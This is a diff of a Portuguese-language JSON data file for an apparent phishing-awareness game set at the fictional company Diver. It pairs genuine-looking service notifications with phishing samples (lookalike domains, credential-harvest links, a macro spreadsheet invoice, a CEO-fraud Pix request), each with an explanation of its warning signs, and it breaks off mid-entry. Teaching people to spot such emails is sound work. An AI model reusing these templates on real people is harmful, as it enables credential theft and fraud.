@@ -3208,87 +3208,286 @@
     {
       "id": "recife-sombrio",
       "tipo": "operacao",
+      "versao": 2,
       "titulo": "Operação Recife Sombrio",
-      "dominio": "diver.app.br",
       "caixa": "agente@soc.diver.app.br",
-      "data": "seg, 28 set",
-      "lancamento": "Diver 2.0",
-      "historia": "Faltam quatro dias para o lançamento do Diver 2.0. Na madrugada de segunda, alguém que assina como Sombra entrou nos sistemas da empresa, copiou o código do app e deixou um recado em todas as telas: \"Na sexta, o lançamento é meu.\" Você é do time de resposta a incidentes (SOC). Em quatro missões, junte as pistas, monte a chave-mestra e descubra quem foi, com o quê e como.",
-      "missoes": [
+      "historia": "A Diver foi invadida. Alguém que assina como Sombra entrou nos sistemas, copiou o código do app e deixou um recado em todas as telas: \"Vocês nem perceberam.\" Você é do time de resposta a incidentes (SOC). Em quatro mergulhos, cada um mais fundo, você junta as pérolas de evidência e descobre quem foi, com o quê e como. A cada caso novo, a Sombra é outra pessoa.",
+      "mergulhos": [
         {
           "id": "isca",
-          "dia": 1,
-          "nivel": "Fácil",
+          "profundidade": "Raso",
+          "metros": "10 m",
           "titulo": "A Isca",
-          "resumo": "Triagem de phishing na caixa de entrada.",
-          "pista": "A",
-          "letra": "M"
+          "resumo": "Triagem de e-mails e rastro da isca.",
+          "pista": "A"
         },
         {
-          "id": "cofre",
-          "dia": 2,
-          "nivel": "Médio",
-          "titulo": "O Cofre",
-          "resumo": "Chave: cofre de 5 dígitos em 90 s. Depois, rede social e repositório.",
+          "id": "cardume",
+          "profundidade": "Recife",
+          "metros": "40 m",
+          "titulo": "O Cardume",
+          "resumo": "Chave: cardume de senhas. Depois, rede social e repositório.",
           "pista": "B",
-          "letra": "A"
+          "chave": "cardume"
         },
         {
-          "id": "trilha",
-          "dia": 3,
-          "nivel": "Difícil",
-          "titulo": "A Trilha",
-          "resumo": "Chave: rastro na rede, capture 5 pedaços. Depois, sala de crise.",
+          "id": "sonar",
+          "profundidade": "Caverna",
+          "metros": "200 m",
+          "titulo": "O Sonar",
+          "resumo": "Chave: sonar da rede. Depois, linha do tempo dos registros.",
           "pista": "C",
-          "letra": "R"
+          "chave": "sonar"
         },
         {
-          "id": "resgate",
-          "dia": 4,
-          "nivel": "Final",
-          "titulo": "O Resgate",
-          "resumo": "Decifrar o bilhete da Sombra e fazer a acusação.",
-          "pista": "D",
-          "letra": "E"
+          "id": "interrogatorio",
+          "profundidade": "Abismo",
+          "metros": "1.000 m",
+          "titulo": "O Interrogatório",
+          "resumo": "Três suspeitos, três depoimentos: quem mentiu?",
+          "pista": "D"
         }
       ],
-      "pistas": [
-        {
-          "letra": "A",
-          "grupo": "QUEM",
-          "codigo": "A-RS7K2Q",
-          "titulo": "Quem vive de recado não chegou perto de servidor",
-          "texto": "Naquela madrugada, quem trabalha falando com o público nem encostou numa máquina da empresa: a Marina fechava uma campanha na agência, a Lia fazia live para milhares de pessoas e a Camila jantava com clientes até o restaurante fechar."
-        },
-        {
-          "letra": "B",
-          "grupo": "COM O QUÊ",
-          "codigo": "B-K4TQ9M",
-          "titulo": "O que estava escrito já não valia",
-          "texto": "Tudo o que vazou por escrito foi trocado dias antes do ataque: senha nova, chave nova, arquivo velho. Quem entrou não usou nada anotado nem a conta de quem já saiu da empresa. A porta estava aberta para alguém que ainda tinha o próprio acesso."
-        },
-        {
-          "letra": "C",
-          "grupo": "COMO",
-          "codigo": "C-W8PZ3D",
-          "titulo": "Nenhuma porta que se abre com o corpo",
-          "texto": "Quem passou pela doca às 03:14 estava atrasado para o turno, não para o crime. Ninguém foi enganado a abrir nada: nenhum e-mail clicado, nenhum QR lido, nenhum telefonema, nenhum pedido de MFA aprovado sem querer. O que mudou o sistema não entrou por porta nem por pendrive: chegou por um caminho que a própria equipe usa todo dia, sem desconfiar."
-        },
-        {
-          "letra": "D",
-          "grupo": "FECHAMENTO",
-          "codigo": "D-5RVN7H",
-          "titulo": "Cinco minutos sem testemunha",
-          "texto": "Entre 03:16 e 03:21 o deploy andou mais rápido do que em qualquer outra hora da noite, e nesses minutos ninguém pediu uma segunda opinião. As bibliotecas de fora bateram com a assinatura: o problema estava num script nosso. Siga o histórico do deploy: quem abriu a porta também passou por ela."
-        }
-      ],
-      "isca": {
-        "emails": [
+      "pistas": {
+        "A": "O que a isca revelou",
+        "B": "O que o cardume escondia",
+        "C": "O que o sonar ouviu",
+        "D": "O que o interrogatório confirmou"
+      },
+      "emails": {
+        "legitimos": [
           {
-            "id": "cracha",
+            "id": "google-alerta",
+            "de": "Google",
+            "email": "no-reply@accounts.google.com",
+            "cor": "azul",
+            "hora": "03:19",
+            "assunto": "Alerta de segurança: novo login na sua Conta do Google",
+            "previa": "Detectamos um novo login na sua Conta do Google…",
+            "corpo": [
+              {
+                "p": "**Novo login em Linux**"
+              },
+              {
+                "p": "Detectamos um novo login na sua Conta do Google em um dispositivo Linux. Se foi você, não é preciso fazer nada. Se não foi, ajudaremos você a proteger sua conta."
+              },
+              {
+                "link": "Verificar atividade",
+                "url": "https://myaccount.google.com/notifications"
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<3xyz-noreply@accounts.google.com>",
+              "spf": "pass",
+              "dkim": "pass (d=accounts.google.com)",
+              "dmarc": "pass",
+              "recebido": "mail-sor-f41.google.com (209.85.220.41)"
+            },
+            "explicacao": "Remetente oficial (accounts.google.com), cabeçalho passa e o link vai para myaccount.google.com. O alerta não pede senha no próprio e-mail.",
+            "pesquisa": "endereço oficial dos alertas de segurança do Google no-reply@accounts.google.com"
+          },
+          {
+            "id": "github-pr",
+            "de": "GitHub",
+            "email": "notifications@github.com",
+            "cor": "cinza",
+            "hora": "09:40",
+            "assunto": "[diver-app/app] Novo pull request: ajusta tela de login",
+            "previa": "nina abriu um pull request…",
+            "corpo": [
+              {
+                "p": "**nina** abriu um pull request em diver-app/app."
+              },
+              {
+                "codigo": "ajusta tela de login\n+ 3 arquivos alterados"
+              },
+              {
+                "link": "Ver no GitHub",
+                "url": "https://github.com/diver-app/app/pull/318"
+              },
+              {
+                "nota": "Você recebe este aviso porque acompanha este repositório."
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<noreply@github.com>",
+              "spf": "pass",
+              "dkim": "pass (d=github.com)",
+              "dmarc": "pass",
+              "recebido": "out-21.smtp.github.com (192.30.252.204)"
+            },
+            "explicacao": "Aviso automático do GitHub, do endereço oficial notifications@github.com, com link para github.com e cabeçalho que passa.",
+            "pesquisa": "notifications@github.com é o e-mail oficial do GitHub"
+          },
+          {
+            "id": "microsoft-codigo",
+            "de": "Equipe de contas da Microsoft",
+            "email": "account-security-noreply@accountprotection.microsoft.com",
+            "cor": "azul",
+            "hora": "08:02",
+            "assunto": "Código de segurança da conta Microsoft",
+            "previa": "Use o código de segurança a seguir…",
+            "corpo": [
+              {
+                "p": "Use o código de segurança a seguir para a conta da Microsoft a***@diver.app.br."
+              },
+              {
+                "codigo": "Código de segurança: 482913"
+              },
+              {
+                "p": "Se você não reconhece a conta, ignore este e-mail. Nunca passe este código para ninguém."
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<account-security-noreply@accountprotection.microsoft.com>",
+              "spf": "pass",
+              "dkim": "pass (d=accountprotection.microsoft.com)",
+              "dmarc": "pass",
+              "recebido": "mail.accountprotection.microsoft.com (40.92.0.20)"
+            },
+            "explicacao": "Endereço oficial de proteção de contas da Microsoft, sem link e sem pedir nada além de não compartilhar o código.",
+            "pesquisa": "account-security-noreply@accountprotection.microsoft.com é legítimo"
+          },
+          {
+            "id": "linkedin",
+            "de": "LinkedIn",
+            "email": "messages-noreply@linkedin.com",
+            "cor": "azul",
+            "hora": "07:30",
+            "assunto": "Você apareceu em 12 pesquisas esta semana",
+            "previa": "Veja quem está procurando por você…",
+            "corpo": [
+              {
+                "p": "Seu perfil apareceu em 12 pesquisas esta semana."
+              },
+              {
+                "link": "Ver pesquisas",
+                "url": "https://www.linkedin.com/me/search-appearances"
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<s-abc@bounce.linkedin.com>",
+              "spf": "pass",
+              "dkim": "pass (d=linkedin.com)",
+              "dmarc": "pass",
+              "recebido": "mailb-ef.linkedin.com (108.174.0.215)"
+            },
+            "explicacao": "Notificação comum do LinkedIn, endereço oficial, link para linkedin.com e nada pedido com pressa.",
+            "pesquisa": "messages-noreply@linkedin.com e-mail oficial do LinkedIn"
+          },
+          {
+            "id": "zoom",
+            "de": "Zoom",
+            "email": "no-reply@zoom.us",
+            "cor": "azul",
+            "hora": "18:05",
+            "assunto": "Gravação na nuvem disponível: Planejamento do app",
+            "previa": "A gravação da sua reunião já está disponível…",
+            "corpo": [
+              {
+                "p": "A gravação da reunião \"Planejamento do app\" já está disponível na nuvem."
+              },
+              {
+                "link": "Ver gravação",
+                "url": "https://zoom.us/rec/share/planejamento-app"
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<bounces+xyz@zoom.us>",
+              "spf": "pass",
+              "dkim": "pass (d=zoom.us)",
+              "dmarc": "pass",
+              "recebido": "o1.email.zoom.us (167.89.0.10)"
+            },
+            "explicacao": "Endereço oficial do Zoom (no-reply@zoom.us) e link para zoom.us. Era uma reunião que a equipe fez.",
+            "pesquisa": "no-reply@zoom.us é o e-mail oficial do Zoom"
+          },
+          {
+            "id": "slack",
+            "de": "Slack",
+            "email": "feedback@slack.com",
+            "cor": "lilas",
+            "hora": "11:12",
+            "assunto": "Você tem novas mensagens em #seguranca",
+            "previa": "Beto mencionou você…",
+            "corpo": [
+              {
+                "p": "**Beto** mencionou você em **#seguranca**: \"Viu o alerta da madrugada?\""
+              },
+              {
+                "link": "Abrir no Slack",
+                "url": "https://diver-app.slack.com/archives/seguranca"
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<bounce@slack.com>",
+              "spf": "pass",
+              "dkim": "pass (d=slack.com)",
+              "dmarc": "pass",
+              "recebido": "mail-sl.slack.com (54.240.0.12)"
+            },
+            "explicacao": "As notificações do Slack chegam de feedback@slack.com, com link para o espaço de trabalho em slack.com.",
+            "pesquisa": "feedback@slack.com notificações oficiais do Slack"
+          },
+          {
+            "id": "dropbox",
+            "de": "Dropbox",
+            "email": "no-reply@dropbox.com",
+            "cor": "azul",
+            "hora": "14:20",
+            "assunto": "Beto compartilhou a pasta \"Relatórios\" com você",
+            "previa": "Beto convidou você para a pasta…",
+            "corpo": [
+              {
+                "p": "**Beto Backup** convidou você para editar a pasta \"Relatórios\"."
+              },
+              {
+                "link": "Ver pasta",
+                "url": "https://www.dropbox.com/scl/fo/relatorios"
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<bounce@dropbox.com>",
+              "spf": "pass",
+              "dkim": "pass (d=dropbox.com)",
+              "dmarc": "pass",
+              "recebido": "mail-out.dropbox.com (162.125.0.5)"
+            },
+            "explicacao": "Endereço oficial do Dropbox e link para dropbox.com. Na dúvida, confirme com o Beto por outro canal.",
+            "pesquisa": "no-reply@dropbox.com é o e-mail oficial do Dropbox"
+          },
+          {
+            "id": "aws",
+            "de": "Amazon Web Services",
+            "email": "no-reply-aws@amazon.com",
+            "cor": "laranja",
+            "hora": "06:02",
+            "assunto": "Sua fatura da AWS está disponível",
+            "previa": "A fatura do período já está disponível…",
+            "corpo": [
+              {
+                "p": "A fatura do período já está disponível no console de faturamento."
+              },
+              {
+                "link": "Ver fatura",
+                "url": "https://console.aws.amazon.com/billing/home"
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<bounces@amazon.com>",
+              "spf": "pass",
+              "dkim": "pass (d=amazon.com)",
+              "dmarc": "pass",
+              "recebido": "a8-31.smtp-out.amazonses.com (54.240.8.31)"
+            },
+            "explicacao": "Endereço oficial da AWS, link para console.aws.amazon.com e sem anexo: a fatura fica no painel.",
+            "pesquisa": "no-reply-aws@amazon.com é o e-mail oficial da AWS"
+          },
+          {
+            "id": "ti-cracha",
             "de": "TI Diver",
             "email": "ti-suporte@diver.app.br",
-            "cor": "azul",
+            "cor": "turquesa",
             "hora": "09:12",
             "assunto": "Renovação do crachá: agende sua foto",
             "previa": "A renovação anual dos crachás começa nesta semana…",
@@ -3297,7 +3496,7 @@
                 "p": "Olá!"
               },
               {
-                "p": "A renovação anual dos crachás começa nesta semana. Agende sua foto na intranet, em **Pessoas > Crachás**, até sexta-feira (02/10)."
+                "p": "A renovação anual dos crachás começa nesta semana. Agende sua foto na intranet, em **Pessoas > Crachás**."
               },
               {
                 "link": "Agendar na intranet",
@@ -3308,70 +3507,30 @@
                 "p": "Dúvidas no canal #ti-suporte.\nEquipe de TI"
               }
             ],
-            "phishing": false,
             "cabecalho": {
-              "returnPath": "<ti-suporte@diver.app.br>",
+              "returnPath": "<{email}>",
               "spf": "pass",
               "dkim": "pass (d=diver.app.br)",
               "dmarc": "pass",
               "recebido": "mail.diver.app.br (10.0.4.12)"
             },
-            "explicacao": "Remetente, link e cabeçalho batem com diver.app.br, e o pedido (agendar a foto na intranet) não pede senha nem tem pressa."
+            "explicacao": "Remetente, link e cabeçalho batem com diver.app.br, e o pedido não envolve senha nem pressa.",
+            "pesquisa": "como conferir o domínio do remetente de um e-mail"
           },
           {
-            "id": "senha",
-            "de": "Segurança da Informação",
-            "email": "seguranca@d1ver.app.br",
-            "cor": "coral",
-            "hora": "09:47",
-            "assunto": "URGENTE: sua senha expira em 1 hora",
-            "previa": "Identificamos que sua senha corporativa expira hoje…",
-            "corpo": [
-              {
-                "p": "Prezado colaborador,"
-              },
-              {
-                "p": "Identificamos que sua senha corporativa **expira hoje às 10:47**. Para evitar o bloqueio da sua conta e a perda de acesso ao e-mail e à VPN, renove agora."
-              },
-              {
-                "link": "Renovar senha agora",
-                "url": "https://d1ver-app.com/renovar-senha",
-                "botao": "perigo",
-                "falso": true
-              },
-              {
-                "p": "Este processo leva menos de 1 minuto.\nSegurança da Informação · Diver"
-              }
-            ],
-            "phishing": true,
-            "forense": true,
-            "cabecalho": {
-              "returnPath": "<null@recifesombrio.io>",
-              "spf": "fail (203.0.113.66 não pode enviar por d1ver.app.br)",
-              "dkim": "none",
-              "dmarc": "fail",
-              "recebido": "smtp.recifesombrio.io (203.0.113.66)",
-              "extra": {
-                "X-Mailer": "SombraMail 2.3",
-                "X-Trace": "UElTVEEgQSB8IFFVRU06IHF1ZW0gdml2ZSBkZSByZWNhZG8gbmFvIGNoZWdvdSBwZXJ0byBkZSBzZXJ2aWRvcg=="
-              }
-            },
-            "explicacao": "O domínio é d1ver (com o número 1 no lugar do i), tem urgência e ameaça de bloqueio, e o link vai para d1ver-app.com. O SPF falhou e o Return-Path é de outro domínio."
-          },
-          {
-            "id": "ponto",
+            "id": "pessoas-ponto",
             "de": "Pessoas Diver",
             "email": "pessoas@diver.app.br",
             "cor": "lilas",
             "hora": "08:31",
-            "assunto": "Folha de ponto de setembro disponível",
-            "previa": "Sua folha de ponto de setembro já está disponível…",
+            "assunto": "Folha de ponto disponível para conferência",
+            "previa": "Sua folha de ponto já está disponível…",
             "corpo": [
               {
                 "p": "Oi!"
               },
               {
-                "p": "Sua folha de ponto de setembro já está disponível para conferência no portal de Pessoas. Ajustes até 05/10."
+                "p": "Sua folha de ponto já está disponível para conferência no portal de Pessoas. Ajustes até o fim da semana."
               },
               {
                 "link": "Conferir folha de ponto",
@@ -3381,133 +3540,247 @@
                 "p": "Abraços,\nTime de Pessoas"
               }
             ],
-            "phishing": false,
             "cabecalho": {
-              "returnPath": "<pessoas@diver.app.br>",
+              "returnPath": "<{email}>",
               "spf": "pass",
               "dkim": "pass (d=diver.app.br)",
               "dmarc": "pass",
               "recebido": "mail.diver.app.br (10.0.4.12)"
             },
-            "explicacao": "Domínio certo, link para o portal da própria empresa e nenhum pedido de senha, anexo ou pressa."
+            "explicacao": "Domínio certo, link para o portal da própria empresa e nenhum pedido de senha, anexo ou pressa.",
+            "pesquisa": "sinais de um e-mail legítimo da empresa"
           },
           {
-            "id": "pr",
-            "de": "Correnteza Code",
-            "email": "notificacoes@correnteza.dev",
-            "cor": "cinza",
-            "hora": "03:17",
-            "assunto": "[diver/app-core] PR #212 mesclado na main",
-            "previa": "caio-commit mesclou o pull request #212…",
+            "id": "operacoes-escala",
+            "de": "Operações Diver",
+            "email": "operacoes@diver.app.br",
+            "cor": "turquesa",
+            "hora": "07:15",
+            "assunto": "Escala do plantão desta semana",
+            "previa": "Segue a escala do plantão de infraestrutura…",
             "corpo": [
               {
-                "p": "**caio-commit** mesclou o pull request **#212** na main."
+                "p": "Pessoal,"
               },
               {
-                "codigo": "chore: atualiza dependências\n+ 1 arquivo alterado · 0 revisões"
+                "p": "Segue a escala do plantão de infraestrutura desta semana. Turno da madrugada com o Téo (manutenção terceirizada)."
               },
               {
-                "link": "Ver pull request",
-                "url": "https://correnteza.dev/diver/app-core/pull/212"
+                "link": "Ver escala completa",
+                "url": "https://intranet.diver.app.br/escalas"
               },
               {
-                "nota": "Você recebe este aviso porque acompanha este repositório."
+                "p": "Operações Diver"
               }
             ],
-            "phishing": false,
             "cabecalho": {
-              "returnPath": "<bounces@correnteza.dev>",
+              "returnPath": "<{email}>",
               "spf": "pass",
-              "dkim": "pass (d=correnteza.dev)",
+              "dkim": "pass (d=diver.app.br)",
               "dmarc": "pass",
-              "recebido": "out-7.correnteza.dev (198.51.100.21)"
+              "recebido": "mail.diver.app.br (10.0.4.12)"
             },
-            "explicacao": "É um aviso automático do serviço de código: domínio, link e cabeçalho batem. Estranho é um PR sem revisão às 3h21. Guarde isso para depois, mas o e-mail em si é legítimo."
+            "explicacao": "Domínio certo, link para a intranet e nenhum pedido estranho. Só um aviso de rotina.",
+            "pesquisa": "como identificar e-mail interno legítimo"
           },
           {
-            "id": "fatura",
+            "id": "seguranca-treino",
+            "de": "Segurança Diver",
+            "email": "seguranca@diver.app.br",
+            "cor": "verde",
+            "hora": "10:00",
+            "assunto": "Lembrete: treinamento de segurança na intranet",
+            "previa": "O treinamento obrigatório continua aberto…",
+            "corpo": [
+              {
+                "p": "O treinamento obrigatório de segurança continua aberto na intranet. Ele leva 20 minutos."
+              },
+              {
+                "link": "Abrir treinamento",
+                "url": "https://intranet.diver.app.br/treinamentos/seguranca"
+              },
+              {
+                "p": "Time de Segurança"
+              }
+            ],
+            "cabecalho": {
+              "returnPath": "<{email}>",
+              "spf": "pass",
+              "dkim": "pass (d=diver.app.br)",
+              "dmarc": "pass",
+              "recebido": "mail.diver.app.br (10.0.4.12)"
+            },
+            "explicacao": "É o domínio verdadeiro (diver.app.br, com \"i\"), link para a intranet e sem ameaça de bloqueio.",
+            "pesquisa": "diferença entre e-mail de segurança verdadeiro e falso"
+          }
+        ],
+        "golpes": [
+          {
+            "id": "g-google",
+            "de": "Google",
+            "email": "no-reply@accounts-google.com.verificacao-login.com",
+            "cor": "azul",
+            "hora": "03:22",
+            "assunto": "Atividade suspeita: confirme sua senha em 24 horas",
+            "previa": "Sua conta será suspensa se você não confirmar…",
+            "corpo": [
+              {
+                "p": "Detectamos atividade suspeita na sua conta. Para evitar a **suspensão em 24 horas**, confirme sua senha agora."
+              },
+              {
+                "link": "Confirmar senha",
+                "url": "https://accounts-google.com.verificacao-login.com/login",
+                "botao": "perigo",
+                "falso": true
+              }
+            ],
+            "spf": "fail",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "O endereço parece do Google, mas o domínio real é verificacao-login.com (o que vem antes é disfarce). O Google não pede senha por e-mail nem ameaça suspender em 24 horas.",
+            "pesquisa": "golpe e-mail falso do Google pedindo senha"
+          },
+          {
+            "id": "g-github",
+            "de": "GitHub",
+            "email": "noreply@githubb-security.com",
+            "cor": "cinza",
+            "hora": "04:10",
+            "assunto": "URGENTE: seu token de acesso foi exposto",
+            "previa": "Revogue seu token em até 1 hora…",
+            "corpo": [
+              {
+                "p": "Encontramos seu token de acesso em um repositório público. **Revogue em até 1 hora** ou sua conta será bloqueada."
+              },
+              {
+                "link": "Revogar token agora",
+                "url": "https://githubb-security.com/revogar",
+                "botao": "perigo",
+                "falso": true
+              }
+            ],
+            "spf": "fail",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "O GitHub oficial escreve de github.com (notifications@github.com). \"githubb\" com dois \"b\" é imitação, e a pressa de 1 hora é a isca.",
+            "pesquisa": "phishing falso GitHub token exposto"
+          },
+          {
+            "id": "g-microsoft",
+            "de": "Microsoft 365",
+            "email": "no-reply@micros0ft-365.com",
+            "cor": "azul",
+            "hora": "05:44",
+            "assunto": "Sua caixa de e-mail está 99% cheia",
+            "previa": "Novas mensagens serão recusadas…",
+            "corpo": [
+              {
+                "p": "Sua caixa de e-mail está **99% cheia**. Novas mensagens serão recusadas. Aumente seu espaço gratuitamente."
+              },
+              {
+                "link": "Aumentar espaço",
+                "url": "https://micros0ft-365.com/upgrade",
+                "botao": "perigo",
+                "falso": true
+              }
+            ],
+            "spf": "fail",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "\"micros0ft\" com zero no lugar do \"o\" é imitação. Aviso de caixa cheia com link para \"aumentar espaço\" é um golpe clássico para roubar a senha.",
+            "pesquisa": "golpe caixa de e-mail cheia Microsoft 365"
+          },
+          {
+            "id": "g-docusign",
+            "de": "DocuSign",
+            "email": "dse@docusign-review.net",
+            "cor": "amarelo",
+            "hora": "13:05",
+            "assunto": "Documento pendente: reajuste salarial",
+            "previa": "Você tem um documento aguardando assinatura…",
+            "corpo": [
+              {
+                "p": "O RH enviou um documento para sua assinatura: **Reajuste salarial**. Assine para garantir o novo valor."
+              },
+              {
+                "link": "Revisar documento",
+                "url": "https://docusign-review.net/doc/assinar",
+                "botao": true,
+                "falso": true
+              }
+            ],
+            "spf": "fail",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "O DocuSign oficial envia de docusign.net (dse@docusign.net); docusign-review.net é outro domínio. \"Reajuste salarial\" é usado para dar curiosidade.",
+            "pesquisa": "golpe DocuSign falso reajuste salarial"
+          },
+          {
+            "id": "g-senha",
+            "de": "Segurança da Informação",
+            "email": "seguranca@d1ver.app.br",
+            "cor": "coral",
+            "hora": "09:47",
+            "assunto": "URGENTE: sua senha expira em 1 hora",
+            "previa": "Identificamos que sua senha corporativa expira…",
+            "corpo": [
+              {
+                "p": "Prezado colaborador,"
+              },
+              {
+                "p": "Sua senha corporativa **expira em 1 hora**. Para evitar o bloqueio da conta e da VPN, renove agora."
+              },
+              {
+                "link": "Renovar senha agora",
+                "url": "https://d1ver-app.com/renovar-senha",
+                "botao": "perigo",
+                "falso": true
+              }
+            ],
+            "spf": "fail",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "d1ver com o número 1 no lugar do \"i\". Urgência e ameaça de bloqueio são a isca; o link vai para d1ver-app.com.",
+            "pesquisa": "golpe e-mail senha expira hoje phishing"
+          },
+          {
+            "id": "g-fatura",
             "de": "Financeiro Diver",
             "email": "financeiro@diver-pagamentos.net",
             "cor": "amarelo",
             "hora": "07:58",
-            "assunto": "Fatura 2026-0917 em anexo, vencimento hoje",
+            "assunto": "Fatura em anexo, vencimento hoje",
             "previa": "Segue em anexo a fatura referente ao contrato…",
             "corpo": [
               {
                 "p": "Bom dia,"
               },
               {
-                "p": "Segue em anexo a fatura referente ao contrato **DVR-INFRA** com vencimento hoje. Favor abrir a planilha e **habilitar o conteúdo** para visualizar os valores atualizados."
+                "p": "Segue em anexo a fatura com vencimento hoje. Favor abrir a planilha e **habilitar o conteúdo** para ver os valores."
               },
               {
-                "p": "Atenciosamente,\nFinanceiro"
-              },
-              {
-                "anexo": "Fatura_2026-0917.xlsm",
+                "anexo": "Fatura_contrato.xlsm",
                 "tamanho": "48 KB",
                 "perigoso": true
               }
             ],
-            "phishing": true,
-            "cabecalho": {
-              "returnPath": "<cobranca@diver-pagamentos.net>",
-              "spf": "pass (para diver-pagamentos.net)",
-              "dkim": "pass (d=diver-pagamentos.net)",
-              "dmarc": "none (domínio sem política)",
-              "recebido": "mx1.diver-pagamentos.net (192.0.2.140)"
-            },
-            "explicacao": "O domínio não é diver.app.br (é diver-pagamentos.net), tem pressa e pede para habilitar o conteúdo de uma planilha .xlsm: o jeito clássico de instalar programa malicioso por macro. O SPF \"passar\" só prova que o golpista é dono do domínio falso."
+            "spf": "pass (para diver-pagamentos.net)",
+            "dkim": "pass (d=diver-pagamentos.net)",
+            "dmarc": "none",
+            "explicacao": "Não é diver.app.br. Pedir para \"habilitar o conteúdo\" de uma planilha .xlsm é o jeito clássico de rodar macro maliciosa. SPF \"passar\" só prova que o golpista é dono do domínio falso.",
+            "pesquisa": "golpe fatura em anexo habilitar conteúdo macro"
           },
           {
-            "id": "nuvem",
-            "de": "Maré Cloud",
-            "email": "nao-responda@marecloud.com",
-            "cor": "laranja",
-            "hora": "06:02",
-            "assunto": "Sua fatura de setembro está disponível",
-            "previa": "A fatura do período de 1 a 30 de setembro já está…",
-            "corpo": [
-              {
-                "p": "Olá, equipe Diver,"
-              },
-              {
-                "p": "A fatura do período de 1 a 30 de setembro já está disponível no painel de cobrança."
-              },
-              {
-                "link": "Ver fatura no painel",
-                "url": "https://painel.marecloud.com/cobranca"
-              },
-              {
-                "p": "Atenciosamente,\nMaré Cloud"
-              }
-            ],
-            "phishing": false,
-            "cabecalho": {
-              "returnPath": "<bounce@marecloud.com>",
-              "spf": "pass",
-              "dkim": "pass (d=marecloud.com)",
-              "dmarc": "pass",
-              "recebido": "mail-out.marecloud.com (198.51.100.77)"
-            },
-            "explicacao": "Fornecedor de nuvem que a empresa usa: domínio e link batem, o cabeçalho passa e não há anexo nem pressa. A fatura fica no painel, não no e-mail."
-          },
-          {
-            "id": "acesso",
+            "id": "g-contas",
             "de": "Central de Contas Diver",
             "email": "contas@diver.app.br",
             "cor": "verde",
             "hora": "03:19",
-            "assunto": "Alerta de segurança: novo acesso à sua conta",
+            "assunto": "Novo acesso à sua conta: proteja agora",
             "previa": "Detectamos um novo acesso à sua conta Diver…",
             "corpo": [
               {
-                "p": "**Novo acesso em Linux**"
-              },
-              {
-                "p": "Detectamos um novo acesso à sua conta Diver num dispositivo Linux, às 03:19, em Recife (PE)."
-              },
-              {
-                "p": "Se não foi você, proteja sua conta agora para evitar o bloqueio."
+                "p": "**Novo acesso em Linux.** Se não foi você, proteja sua conta agora para evitar o bloqueio."
               },
               {
                 "link": "Não fui eu: proteger conta",
@@ -3515,186 +3788,311 @@
                 "falso": true
               }
             ],
-            "phishing": true,
-            "cabecalho": {
-              "returnPath": "<bounce@diver-app.support>",
-              "spf": "fail (203.0.113.66 não pode enviar por diver.app.br)",
-              "dkim": "pass (d=diver-app.support)",
-              "dmarc": "fail",
-              "recebido": "relay.diver-app.support (203.0.113.66)"
-            },
-            "explicacao": "O remetente parece certo, mas o cabeçalho entrega: SPF e DMARC falharam e o Return-Path é diver-app.support. O link termina em protege-conta.com: o \"diver.app.br\" no começo é só disfarce."
+            "spf": "fail (o servidor não pode enviar por diver.app.br)",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "O remetente parece certo, mas o cabeçalho entrega: SPF e DMARC falharam. O link termina em protege-conta.com; o \"diver.app.br\" no começo é disfarce.",
+            "pesquisa": "e-mail com remetente falsificado spoofing SPF DMARC"
           },
           {
-            "id": "escala",
-            "de": "Operações Diver",
-            "email": "operacoes@diver.app.br",
-            "cor": "turquesa",
-            "hora": "07:15",
-            "assunto": "Escala do plantão, semana 40",
-            "previa": "Segue a escala do plantão de infraestrutura…",
+            "id": "g-diretor",
+            "de": "Dr. Dobrão",
+            "email": "dobrao.diretoria@email-executivo.com",
+            "cor": "amarelo",
+            "hora": "16:48",
+            "assunto": "Preciso de um favor urgente e confidencial",
+            "previa": "Estou em reunião e preciso que você faça um Pix…",
             "corpo": [
               {
-                "p": "Pessoal,"
+                "p": "Estou numa reunião e não posso falar. Preciso que você faça um **Pix urgente** para um fornecedor. Não comente com ninguém, depois te explico."
               },
               {
-                "p": "Segue a escala do plantão de infraestrutura da semana 40. Turno da madrugada com o Téo (manutenção terceirizada), de segunda a quinta."
-              },
-              {
-                "link": "Ver escala completa",
-                "url": "https://intranet.diver.app.br/escalas/40"
-              },
-              {
-                "p": "Operações Diver"
+                "p": "Responda este e-mail que eu passo os dados."
               }
             ],
-            "phishing": false,
-            "cabecalho": {
-              "returnPath": "<operacoes@diver.app.br>",
-              "spf": "pass",
-              "dkim": "pass (d=diver.app.br)",
-              "dmarc": "pass",
-              "recebido": "mail.diver.app.br (10.0.4.12)"
-            },
-            "explicacao": "Domínio certo, link para a intranet e nenhum pedido estranho. Só um aviso de rotina."
+            "spf": "pass (para email-executivo.com)",
+            "dkim": "pass (d=email-executivo.com)",
+            "dmarc": "none",
+            "explicacao": "Golpe do falso diretor (BEC): e-mail de fora da empresa, pressa, segredo e dinheiro. Confirme sempre por outro canal, falando com a pessoa.",
+            "pesquisa": "golpe do falso diretor e-mail transferência urgente BEC"
+          },
+          {
+            "id": "g-entrega",
+            "de": "Entregas Express",
+            "email": "rastreio@entregas-express-br.com",
+            "cor": "laranja",
+            "hora": "12:30",
+            "assunto": "Sua encomenda está retida: pague a taxa",
+            "previa": "Pague a taxa de R$ 9,90 para liberar…",
+            "corpo": [
+              {
+                "p": "Sua encomenda está **retida**. Pague a taxa de liberação de R$ 9,90 em até 24 horas ou ela será devolvida."
+              },
+              {
+                "link": "Pagar taxa",
+                "url": "https://entregas-express-br.com/taxa",
+                "botao": "perigo",
+                "falso": true
+              }
+            ],
+            "spf": "pass (para entregas-express-br.com)",
+            "dkim": "none",
+            "dmarc": "none",
+            "explicacao": "Ninguém da Diver comprou nada. Taxa pequena com prazo curto para \"liberar encomenda\" é um golpe muito comum no Brasil.",
+            "pesquisa": "golpe taxa de entrega encomenda retida"
+          },
+          {
+            "id": "g-dropbox",
